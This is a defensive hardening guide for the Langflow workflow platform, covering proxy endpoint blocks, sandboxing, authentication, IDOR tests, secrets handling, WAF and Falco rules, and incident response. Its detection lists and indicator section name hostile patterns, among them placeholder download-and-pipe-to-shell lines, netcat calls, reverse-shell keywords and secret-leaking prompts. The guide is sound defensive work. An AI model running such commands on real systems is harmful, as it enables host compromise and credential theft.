# Langflow Hardening Guidance

Securing Langflow requires moving beyond “out-of-the-box” settings, which are often optimized for local development rather than production security. Langflow, n8n, and other workflow automation platforms are increasingly targeted because they often run with broad API access, embedded secrets, LLM provider keys, cloud credentials, and database access while being deployed outside standard security review processes.

Langflow should be treated as both:

1. **A web application**, because it exposes APIs, users, flows, authentication, and browser-accessible interfaces.
2. **A code-execution runtime**, because flow building and custom components can execute Python code and interact with the host environment.

In production, secure Langflow like a developer platform, not like a normal web app.

---

## Core Security Principle

> Assume that a compromised Langflow instance gives an attacker code execution on the underlying host or worker.

Langflow neither provides strong isolation between users inside a single process nor fully restricts access to the local filesystem, environment variables, database, or network resources. If untrusted users, public endpoints, LLM-generated code, or multi-tenant workflows are involved, Langflow should be isolated, sandboxed, and tightly controlled.

---

## Network Architecture and Segmentation

### Private-First Deployment

Deploy Langflow inside a private VPC or private network segment.

Langflow should not be directly exposed to the public internet unless there is a deliberate, documented, reviewed, and monitored reason to do so.

Access should be limited through one or more of the following:

* VPN
* ZTNA / Zero Trust Network Access
* Private service mesh
* Internal load balancer
* Bastion-controlled admin access
* Corporate SSO-protected reverse proxy

Public exposure dramatically increases the likelihood of opportunistic exploitation.

---

### Reverse Proxy or API Gateway

Place Langflow behind a reverse proxy or API gateway such as:

* Caddy
* Nginx
* Traefik
* Envoy
* Cloudflare Access
* AWS ALB / API Gateway
* Azure Application Gateway
* GCP Load Balancer / IAP

The proxy should handle:

* TLS termination
* Centralized authentication
* Rate limiting
* Request size limits
* IP allowlisting
* Header normalization
* Security headers
* Access logging
* Endpoint-level blocking
* Optional WAF rules

---

### Endpoint-Level Allowlisting

Do not expose every Langflow endpoint by default.

In production, expose only the endpoints required for the intended use case. If Langflow is used only for internal flow execution, block administrative, flow-building, public temporary build, export/import, debug, and user-management endpoints at the proxy.

High-risk endpoints should be explicitly reviewed, restricted, or blocked.

Examples of endpoints and patterns to review:

```text
/api/v1/auto_login
/api/v1/build_public_tmp/*/flow
/api/v1/flows/
/api/v1/users/
/api/v1/api_key/
/api/v1/variables/
/api/v1/responses
/api/v1/login
/api/v1/logout
/api/v1/store
/api/v1/projects
/api/v1/folders
```

---

### Disable or Block `auto_login`

`auto_login` is a high-risk feature outside local development.

Disable it in all production, staging, shared, or internet-accessible environments. If it cannot be disabled in configuration, block it at the reverse proxy.

Example Nginx rule:

```nginx
location = /api/v1/auto_login {
    deny all;
    return 403;
}
```

Example Caddy matcher:

```caddyfile
@blocked_auto_login path /api/v1/auto_login
respond @blocked_auto_login 403
```

---

### Disable Public Flow Building

If public flow features are not required, disable them entirely.

Public flow-building endpoints increase attack surface and have historically been associated with severe Langflow exploitation paths. If flow building is only needed by trusted internal administrators, restrict it to trusted networks or authenticated admin groups.

---

### Block Known Vulnerable Build Paths

If vulnerable versions cannot be immediately upgraded, block vulnerable public build endpoints at the proxy while patching is underway.

Example Nginx rule:

```nginx
location ~ ^/api/v1/build_public_tmp/.*/flow$ {
    deny all;
    return 403;
}
```

This should be treated as a temporary mitigation, not a substitute for patching.

---

### SSRF Protection

Enable and tune SSRF protections for any Langflow component capable of making outbound HTTP requests.

Block access to:

```text
127.0.0.0/8
localhost
0.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
169.254.169.254
::1
fc00::/7
fe80::/10
```

Pay special attention to cloud metadata services:

```text
http://169.254.169.254/
http://metadata.google.internal/
http://169.254.169.254/latest/meta-data/
```

Where possible, enforce SSRF protections at multiple layers:

* Application configuration
* Reverse proxy
* Egress firewall
* Cloud security groups
* Kubernetes NetworkPolicies
* Service mesh egress policies

---

### Strict Egress Filtering

AI agents are high-risk for data exfiltration.

Use outbound firewall rules to restrict Langflow to an allowlist of verified destinations, such as:

```text
api.openai.com
api.anthropic.com
api.cohere.com
*.azure.com
*.amazonaws.com
*.googleapis.com
```

Only allow destinations that are required by approved flows.

Block arbitrary outbound internet access from Langflow containers and workers. This reduces the impact of RCE, prompt-injected tools, malicious components, and credential theft attempts.

---

### Network Segmentation

Place Langflow in a segmented network zone.

Langflow should not have unrestricted access to:

* Internal databases
* Kubernetes API server
* Cloud metadata endpoints
* CI/CD systems
* Source control systems
* Production admin panels
* Secrets management systems
* Internal dashboards
* Developer laptops
* Domain controllers
* Private service networks

Use firewall rules, security groups, and service mesh policies to define exactly which systems Langflow may reach.

---

## Sandboxed Execution and Runtime Isolation

Langflow can execute Python through custom components and flow-building logic. In high-security or multi-tenant environments, this must be sandboxed.

Recommended isolation options:

* Dedicated worker containers
* gVisor
* Firecracker micro-VMs
* Kata Containers
* Kubernetes sandboxed runtimes
* Per-user or per-tenant workers
* Separate namespaces per tenant
* Dedicated service accounts per workspace
* Ephemeral workers for untrusted execution

Do not run untrusted flow execution in the same long-lived process that stores or manages sensitive credentials.

---

### Container Hardening

Run Langflow as a low-privilege user, not root.

Docker example:

```dockerfile
USER 1000:1000
```

Kubernetes example:

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  runAsGroup: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

Recommended container controls:

* Non-root user
* Read-only root filesystem
* No privileged containers
* No host networking
* No host PID namespace
* No hostPath mounts unless absolutely required
* Drop Linux capabilities
* Apply seccomp profile
* Apply AppArmor or SELinux profile
* Mount `/tmp` as isolated and size-limited
* Consider `noexec` where compatible
* Restrict access to Docker socket
* Restrict access to Kubernetes service account tokens

---

### Process Execution Controls

Because RCE payloads commonly spawn shells or downloaders, monitor and, where possible, block dangerous child processes from the Langflow process.

Alert on Langflow or Python spawning:

```text
sh
bash
curl
wget
nc
ncat
socat
python
python3
perl
ruby
chmod
chown
tar
base64
openssl
ssh
scp
```

Example detection logic:

```text
Parent process: langflow, python, uvicorn, gunicorn
Child process: sh, bash, curl, wget, nc, chmod, python, perl
Severity: High
Action: Alert or block
```

Also alert on suspicious writes:

```text
/tmp/lang_pwn
/tmp/*
/dev/shm/*
/var/tmp/*
```

Especially if files are made executable or followed by outbound network connections.

---

## Authentication and Identity Management

### Use Corporate Identity

Do not rely on local Langflow users for production access if corporate identity is available.

Integrate with:

* Okta
* Azure AD / Entra ID
* Google Workspace
* Auth0
* OneLogin
* Keycloak
* Ping Identity
* OIDC-compatible identity providers

Require:

* SSO
* MFA
* Conditional access
* Device posture checks where available
* Centralized user lifecycle management
* Group-based authorization

---

### Authentication Proxy

For production deployments, place Langflow behind an authentication proxy so all endpoints require authentication before reaching Langflow.

Examples:

* Cloudflare Access
* oauth2-proxy
* Pomerium
* Teleport
* Google IAP
* Azure App Proxy
* Tailscale Funnel with identity controls
* Zscaler Private Access

This is especially important for endpoints that may not enforce authentication consistently.

---

### JWT Hardening

Langflow’s JWT documentation recommends stronger asymmetric algorithms for production deployments that need enhanced security.

Avoid default symmetric HS256 where possible.

Prefer:

```env
LANGFLOW_ALGORITHM="RS256"
```

or, where supported and appropriate:

```env
LANGFLOW_ALGORITHM="RS512"
```

Recommended JWT practices:

* Use asymmetric signing keys.
* Store private keys outside the container image.
* Mount keys from a secret manager or secure volume.
* Rotate signing keys on a defined schedule.
* Use strong key sizes.
* Protect private keys with strict filesystem permissions.
* Avoid committing keys to source control.
* Avoid sharing signing keys across environments.

Example key generation:

```bash
openssl genrsa -out private_key.pem 2048
openssl rsa -in private_key.pem -pubout -out public_key.pem
```

---

### Session and API Key Controls

Apply strong controls to sessions and API keys:

* Short session lifetimes
* Secure cookies
* HTTP-only cookies
* SameSite cookie policy
* API key expiration
* API key ownership tracking
* API key rotation
* Per-user or per-service API keys
* Immediate revocation on user offboarding
* Logging of API key creation and use

Avoid shared administrator API keys.

---

## Tenant Isolation and Object-Level Authorization

### Do Not Rely on UUIDs for Authorization

Random UUIDs are not an authorization control.

Every API endpoint that accepts one of the following must enforce server-side ownership or tenant checks:

```text
flow ID
flow UUID
endpoint name
user ID
workspace ID
project ID
folder ID
API key ID
variable ID
credential ID
file ID
component ID
```

The server must verify that the authenticated caller is allowed to access, execute, modify, export, or delete the referenced object.

---

### Object-Level Authorization Testing

Add automated IDOR tests to CI/CD and pre-release security testing.

Minimum test pattern:

```text
1. Create User A.
2. Create User B.
3. User A creates a flow.
4. Capture User A's flow UUID.
5. Authenticate as User B.
6. Attempt to read, execute, update, clone, export, delete, or invoke User A's flow by UUID.
7. Confirm every attempt returns 403 or 404.
```

Repeat the same pattern for:

```text
flows
variables
API keys
projects
folders
files
components
credentials
users
workspaces
```

---

### Treat Object Listing as Critical Attack Surface

Object-listing endpoints can turn otherwise unguessable IDs into exploitable IDORs.

Review and restrict endpoints such as:

```text
GET /api/v1/flows/
GET /api/v1/users/
GET /api/v1/api_key/
GET /api/v1/variables/
GET /api/v1/projects/
GET /api/v1/folders/
```

These endpoints must return only objects owned by or explicitly shared with the authenticated caller.

Do not expose tenant-wide object lists to normal users.

---

### Multi-Tenant Deployments

If Langflow is used in a managed or multi-tenant environment, tenant isolation must be treated as a first-class security boundary.

Recommended controls:

* Separate databases per tenant where practical
* Separate workers per tenant
* Separate secrets per tenant
* Separate service accounts per tenant
* Per-tenant network egress policies
* Per-tenant encryption keys
* Tenant-aware audit logs
* Object-level authorization on every endpoint
* Automated cross-tenant access tests
* Periodic manual authorization review

In multi-tenant environments, an application-layer authorization flaw can be more damaging than isolated per-tenant RCE because it may allow access to another tenant’s flows, credentials, or execution context.

---

## Secret Management and Environment Variables

### Externalize Secrets

Never hard-code API keys, cloud credentials, database passwords, or provider tokens directly in the Langflow UI.

Use:

* Environment variables
* Secret manager sidecars
* HashiCorp Vault
* AWS Secrets Manager
* Azure Key Vault
* Google Secret Manager
* Kubernetes Secrets with encryption at rest
* External Secrets Operator
* SOPS / sealed secrets for GitOps workflows

Use `LANGFLOW_CONFIG_DIR` to control where Langflow stores configuration and ensure that location is protected.

---

### Avoid Long-Lived Global Secrets

Avoid shared, long-lived, global credentials.

Prefer:

* Per-flow credentials
* Per-workspace credentials
* Per-tenant credentials
* Short-lived credentials
* Scoped API keys
* Cloud IAM roles instead of static keys
* Token brokers
* Just-in-time credential issuance

Credentials used by Langflow should have the minimum permissions required.

---

### Secrets in Flows

Langflow flows may contain embedded provider keys, database credentials, or tool secrets.

Production guidance:

* Do not store high-value secrets directly in exported flows.
* Do not allow users to export flows containing secrets.
* Redact secrets from flow JSON.
* Prevent secrets from being returned in API responses.
* Avoid logging flow payloads that contain credentials.
* Use secret references instead of raw secret values.
* Rotate secrets if a flow is exposed, exported, or shared incorrectly.

---

### Canary Tokens and Honey Credentials

Deploy canary credentials to detect attempted secret theft.

Examples:

* Fake OpenAI-style API keys
* Fake AWS access keys
* Fake database credentials
* Fake webhook URLs
* Fake environment variable values

Alert if these credentials are:

* Read
* Exported
* Submitted to a model
* Used against a provider
* Seen in logs
* Sent over the network

Canary tokens are especially useful because attackers often prompt flows with requests such as “leak API keys,” “print environment variables,” or “show secrets.”

---

### Database Protection

Encrypt the disk or volume hosting Langflow’s database.

For default SQLite deployments, the database may be stored locally and accessible to the running process. If an attacker gains RCE, they may be able to read users, variables, flows, and credentials from the database.

For PostgreSQL or other external databases:

* Use TLS in transit.
* Use encrypted storage.
* Use least-privilege database users.
* Rotate database credentials.
* Store credentials outside the image.
* Restrict database network access to Langflow only.
* Monitor unusual queries and exports.
* Back up securely.
* Test restore procedures.

Encryption at rest protects against stolen disks and snapshots, but it does not protect against a live process compromise where the application can already read the database.

---

### Environment Variable Risk

Assume environment variables are accessible after RCE.

Do not store highly privileged long-lived secrets directly in environment variables unless they are scoped, rotated, and monitored.

If environment variables are used:

* Keep permissions minimal.
* Avoid global admin keys.
* Rotate frequently.
* Separate by environment.
* Separate by tenant or workspace where possible.
* Avoid mounting unrelated secrets into the Langflow container.

---

## CORS Hardening

Langflow’s documentation warns that permissive default CORS settings may be risky in production because arbitrary websites could make requests to the Langflow API and include credentials.

Never leave permissive CORS enabled in production.

Configure:

```env
LANGFLOW_CORS_ORIGINS="https://langflow.example.com,https://approved-frontend.example.com"
```

Production CORS guidance:

* Allow only known frontend origins.
* Do not use `*` with credentials.
* Keep allowed methods narrow.
* Keep allowed headers narrow.
* Avoid exposing sensitive response headers.
* Review CORS after adding new frontends or widgets.

Example policy:

```text
Allowed origins:
- https://langflow.example.com

Allowed methods:
- GET
- POST
- PUT
- DELETE where required

Allowed headers:
- Authorization
- Content-Type
- X-Requested-With
```

---

## Web Security Headers

Security headers do not stop backend RCE or IDOR vulnerabilities, but they reduce browser-side risk and should be part of the baseline.

Recommended headers:

```text
Strict-Transport-Security
X-Content-Type-Options
X-Frame-Options
Referrer-Policy
Permissions-Policy
Content-Security-Policy
```

---

### Baseline Caddy Configuration

```caddyfile
{$DOMAIN} {
    encode gzip zstd

    header {
        Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
        X-Content-Type-Options "nosniff"
        X-Frame-Options "DENY"
        Referrer-Policy "strict-origin-when-cross-origin"
        Permissions-Policy "geolocation=(), microphone=(), camera=()"
    }

    reverse_proxy langflow:7860

    tls {$EMAIL}
}
```

Notes:

* Caddy already sets `X-Forwarded-For`, `X-Forwarded-Proto`, and `X-Forwarded-Host` by default in `reverse_proxy`.
* Caddy ignores spoofed incoming forwarded headers unless trusted proxies are configured.
* `X-Frame-Options "DENY"` prevents clickjacking but also prevents embedding Langflow in iframes.
* Use `SAMEORIGIN` instead of `DENY` only if same-origin embedding is required.
* Caddy handles WebSockets automatically, but long-lived builder sessions may require timeout tuning.

---

### Hardened Caddy Configuration

```caddyfile
{$DOMAIN} {
    encode gzip zstd

    # Block high-risk endpoints if not required
    @blocked_auto_login path /api/v1/auto_login
    respond @blocked_auto_login 403

    @blocked_public_build path_regexp public_build ^/api/v1/build_public_tmp/.*/flow$
    respond @blocked_public_build 403

    # Security headers
    header {
        # HSTS - 1 year
        Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

        # Prevent MIME sniffing
        X-Content-Type-Options "nosniff"

        # Prevent clickjacking
        X-Frame-Options "DENY"

        # Privacy-conscious referrer behavior
        Referrer-Policy "strict-origin-when-cross-origin"

        # Disable unused browser APIs
        Permissions-Policy "geolocation=(), microphone=(), camera=(), interest-cohort=()"

        # Basic CSP. Validate in browser before enforcing broadly.
        Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' wss:;"
    }

    reverse_proxy langflow:7860 {
        header_up X-Forwarded-Proto {scheme}
        header_up X-Forwarded-Host {host}

        # Useful for streaming and WebSocket-heavy behavior.
        # Treat as a tuning setting, not a core hardening control.
        flush_interval -1
    }

    tls {$EMAIL}
}
```

---

### Content Security Policy Notes

A strict CSP may break Langflow unless tested in-browser.

Baseline CSP candidate:

```text
default-src 'self';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
connect-src 'self' wss:;
```

Important notes:

* `connect-src 'self' wss:` only allows same-origin HTTP(S) and WebSocket connections.
* Adjust `connect-src` if the frontend directly calls external APIs.
* Avoid adding broad wildcards.
* Test the full UI before enforcing CSP.
* Consider starting with `Content-Security-Policy-Report-Only`.

---

## Patch Management

### Upgrade Aggressively

Keep Langflow upgraded to the latest available release.

Do not pin production deployments to old Langflow versions unless there is an explicit exception and compensating controls.

Recommended process:

1. Subscribe to Langflow security advisories.
2. Monitor the Langflow `SECURITY.md`.
3. Track CISA KEV additions.
4. Track vendor and threat intelligence reports.
5. Test upgrades in staging.
6. Deploy security releases quickly.
7. Maintain a rollback plan.
8. Verify the running version after deployment.

---

### Version-Specific Notes

Where applicable, ensure that deployed versions include fixes for both:

* Public temporary flow-build RCE paths.
* Cross-tenant flow UUID authorization issues.

If multiple Langflow vulnerabilities are being tracked, upgrade to the latest release rather than stopping at the first version that fixes only one issue.

---

### Temporary Workarounds

If immediate patching is not possible, apply compensating controls:

* Restrict access to trusted IP ranges.
* Require authentication before all Langflow endpoints.
* Disable public flow functionality.
* Block known vulnerable endpoints.
* Apply strict egress filtering.
* Add WAF signatures for suspicious Python payloads.
* Increase logging and alerting.
* Rotate secrets after suspected exposure.

Example Nginx endpoint block:

```nginx
location ~ ^/api/v1/build_public_tmp/.*/flow$ {
    deny all;
    return 403;
}
```

Example network restriction:

```bash
iptables -A INPUT -p tcp --dport 7860 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 7860 -j DROP
```

---

## WAF and Request Filtering

A WAF should not be the primary defense, but it can reduce exposure while patching.

Look for suspicious request bodies containing:

```text
exec(
eval(
subprocess
os.system
__import__
pty.spawn
bash -i
curl
wget
| sh
base64 -d
/bin/sh
/bin/bash
nc -e
```

High-risk endpoints for WAF inspection:

```text
/api/v1/build_public_tmp/*/flow
/api/v1/responses
/api/v1/flows/
/api/v1/variables/
/api/v1/api_key/
```

Be careful with false positives. Langflow may legitimately process code-like content depending on usage.

---

## Logging and Monitoring

### API Logging

Enable detailed API logging where privacy and compliance requirements allow.

Capture:

* Timestamp
* Source IP
* Authenticated user
* Tenant or workspace
* HTTP method
* Path
* Status code
* User agent
* Request size
* Response size
* Flow ID or model ID
* API key ID where applicable
* Correlation ID

Avoid logging raw secrets, bearer tokens, provider keys, or full sensitive prompts unless there is a specific incident-response need and appropriate protections are in place.

---

### Langflow-Specific Detection Rules

Alert on the following behaviors:

```text
GET /api/v1/auto_login from non-admin IPs
Repeated GET /api/v1/auto_login
GET /api/v1/flows/ followed by POST /api/v1/responses
POST /api/v1/responses where model is a UUID not owned by the caller
POST /api/v1/responses containing prompts such as "leak api keys", "print env", "show secrets"
POST /api/v1/build_public_tmp/*/flow
POST requests containing suspicious Python execution patterns
Flow execution immediately followed by unusual outbound network connections
Langflow parent process spawning curl, wget, sh, bash, nc, or chmod
Writes to /tmp/lang_pwn
Executable files written under /tmp, /var/tmp, or /dev/shm
New users created unexpectedly
New API keys created unexpectedly
Flow exports by unusual users
Large or unusual reads of variables, credentials, or flow configuration
```

---

### Runtime Detection

Use EDR, container runtime security, or Kubernetes detection tools to monitor:

* Unexpected child processes
* Shell execution from Langflow
* Download-and-execute behavior
* Reverse shell patterns
* Unexpected outbound connections
* File writes to temporary directories
* New cron jobs
* New SSH keys
* New users
* Changes to startup scripts
* Access to cloud metadata services
* Access to local databases
* Reads of `.env` files
* Reads of Langflow database files

Useful tools include:

* Falco
* Sysdig Secure
* Tracee
* Aqua
* Prisma Cloud
* Wiz
* CrowdStrike
* Microsoft Defender for Cloud
* Datadog Cloud Security
* Elastic Defend
* OSQuery

---

### Example Falco-Style Detection Ideas

```yaml
- rule: Langflow Spawning Shell
  desc: Detect Langflow or Python process spawning a shell
  condition: >
    spawned_process and
    proc.pname in (python, python3, langflow, uvicorn, gunicorn) and
    proc.name in (sh, bash, dash, zsh)
  output: >
    Langflow-related process spawned shell
    parent=%proc.pname child=%proc.name cmdline=%proc.cmdline user=%user.name
  priority: CRITICAL
```

```yaml
- rule: Langflow Download Execute Pattern
  desc: Detect curl or wget from Langflow process
  condition: >
    spawned_process and
    proc.pname in (python, python3, langflow, uvicorn, gunicorn) and
    proc.name in (curl, wget)
  output: >
    Langflow-related process spawned downloader
    parent=%proc.pname child=%proc.name cmdline=%proc.cmdline user=%user.name
  priority: HIGH
```

---

## Indicators of Compromise to Monitor

Monitor for:

```text
Unexpected POST requests to /api/v1/build_public_tmp/*/flow
Unexpected POST requests to /api/v1/responses using flow UUIDs
Prompts or inputs requesting secrets, API keys, env vars, or credentials
Unusual process spawning from Langflow
Outbound connections to unknown IPs
Outbound HTTP requests followed by shell execution
Creation of /tmp/lang_pwn
New user accounts
New API keys
New SSH keys
Unexpected changes to flows
Unexpected exports of flows
Unexpected reads of variables
Unexpected access to langflow.db
```

Example suspicious command patterns:

```text
curl -fsSL http://<ip>:<port>/<path> | sh
wget -q http://<ip>:<port>/<path> -O- | sh
bash -c
sh -c
python -c
nc <ip> <port>
```

---

## Secret Exposure Response

If exploitation is suspected, assume secrets may be compromised.

Immediate actions:

1. Remove Langflow from public access.
2. Isolate the host or container.
3. Preserve logs and forensic evidence.
4. Rotate Langflow API keys.
5. Rotate LLM provider keys.
6. Rotate cloud credentials.
7. Rotate database credentials.
8. Rotate webhook secrets.
9. Rotate OAuth client secrets.
10. Revoke suspicious sessions.
11. Review users and API keys.
12. Review flows for malicious changes.
13. Review variables and stored credentials.
14. Review outbound network logs.
15. Review process execution history.
16. Rebuild from a known-good image.
17. Upgrade Langflow.
18. Restore service behind stronger access controls.

Do not simply restart the container and assume the issue is resolved.

---

## Incident Response Checklist

### Containment

```text
[ ] Remove public access.
[ ] Block vulnerable endpoints.
[ ] Disable auto_login.
[ ] Disable public flow building.
[ ] Restrict access to trusted IPs or VPN.
[ ] Block outbound internet except approved destinations.
[ ] Snapshot affected systems for forensics.
[ ] Preserve application, proxy, EDR, and cloud logs.
```

### Investigation

```text
[ ] Review requests to /api/v1/auto_login.
[ ] Review requests to /api/v1/flows/.
[ ] Review requests to /api/v1/responses.
[ ] Review requests to /api/v1/build_public_tmp/*/flow.
[ ] Look for suspicious prompts requesting secrets.
[ ] Look for child processes spawned by Langflow.
[ ] Look for curl, wget, bash, sh, nc, or chmod.
[ ] Look for writes to /tmp, /var/tmp, and /dev/shm.
[ ] Look for outbound connections to unknown IPs.
[ ] Review newly created users.
[ ] Review newly created API keys.
[ ] Review modified flows.
[ ] Review exported flows.
[ ] Review credential and variable access.
```

### Eradication and Recovery

```text
[ ] Upgrade Langflow to the latest version.
[ ] Rebuild containers from known-good images.
[ ] Rotate all exposed or potentially exposed secrets.
[ ] Remove unauthorized users and API keys.
[ ] Remove malicious flows or components.
[ ] Re-enable service only behind authenticated access.
[ ] Confirm endpoint blocks and egress controls are active.
[ ] Validate object-level authorization.
[ ] Confirm logging and alerts are working.
```

---

## Production Deployment Checklist

### Access Control

```text
[ ] Langflow is not directly exposed to the public internet.
[ ] Access requires VPN, ZTNA, SSO, or an authentication proxy.
[ ] MFA is enforced.
[ ] Local users are disabled or tightly controlled.
[ ] Admin access is limited to named users.
[ ] API keys are scoped and rotated.
```

### Endpoint Hardening

```text
[ ] /api/v1/auto_login is disabled or blocked.
[ ] /api/v1/build_public_tmp/*/flow is disabled or blocked if not required.
[ ] Public flow building is disabled if not required.
[ ] Admin endpoints are restricted.
[ ] User-management endpoints are restricted.
[ ] Export/import endpoints are restricted.
[ ] Only required endpoints are exposed.
```

### Tenant and Authorization Controls

```text
[ ] Flow UUIDs are not treated as authorization.
[ ] Object-level authorization is enforced server-side.
[ ] Cross-user access tests are automated.
[ ] Object-listing endpoints return only authorized objects.
[ ] Multi-tenant deployments use strong tenant isolation.
[ ] Per-tenant secrets and workers are used where practical.
```

### Runtime Security

```text
[ ] Langflow runs as non-root.
[ ] Root filesystem is read-only where possible.
[ ] Linux capabilities are dropped.
[ ] Privilege escalation is disabled.
[ ] Seccomp/AppArmor/SELinux is enabled.
[ ] Workers are sandboxed where required.
[ ] Shell spawning is monitored or blocked.
[ ] Download-and-execute behavior is monitored or blocked.
```

### Network Security

```text
[ ] Langflow runs in a private VPC or private subnet.
[ ] Inbound access is restricted.
[ ] Egress is allowlisted.
[ ] Cloud metadata access is blocked.
[ ] Internal network access is minimized.
[ ] SSRF protections are enforced.
```

### Secrets

```text
[ ] Secrets are not hard-coded in flows.
[ ] Secrets are stored in a secret manager.
[ ] Secrets are scoped per tenant, workspace, or flow.
[ ] Long-lived global keys are avoided.
[ ] Canary tokens are deployed.
[ ] Secret access is logged.
[ ] Secret rotation procedures are tested.
```

### Web Security

```text
[ ] CORS is restricted to known origins.
[ ] Security headers are configured.
[ ] CSP is tested and enforced or report-only.
[ ] TLS is enabled.
[ ] HSTS is enabled.
[ ] Clickjacking protections are enabled.
```

### Monitoring

```text
[ ] API access logs are enabled.
[ ] Proxy logs are retained.
[ ] Runtime process monitoring is enabled.
[ ] EDR or container detection is enabled.
[ ] Alerts exist for suspicious Langflow endpoints.
[ ] Alerts exist for suspicious process execution.
[ ] Alerts exist for unusual outbound connections.
[ ] Alerts exist for new users and API keys.
```

### Patch Management

```text
[ ] Langflow version is current.
[ ] Security advisories are monitored.
[ ] CISA KEV is monitored.
[ ] Upgrade process is tested.
[ ] Emergency patch process exists.
[ ] Temporary mitigations are documented.
```

---

## Summary

The most important Langflow hardening controls are:

1. Keep Langflow off the public internet.
2. Require SSO, VPN, ZTNA, or an authentication proxy.
3. Disable `auto_login` outside local development.
4. Disable or block public flow-building endpoints where not required.
5. Upgrade Langflow aggressively.
6. Enforce object-level authorization on every flow, variable, key, and workspace object.
7. Treat object-listing endpoints as part of the IDOR attack surface.
8. Use strict egress filtering.
9. Sandbox flow execution.
10. Run containers as non-root with minimal privileges.
11. Keep secrets out of flows and use scoped, short-lived credentials.
12. Monitor for shell execution, downloader behavior, suspicious prompts, and unusual outbound connections.

Langflow should be secured as a code-execution platform with access to sensitive credentials. A normal web-app hardening baseline is not enough.
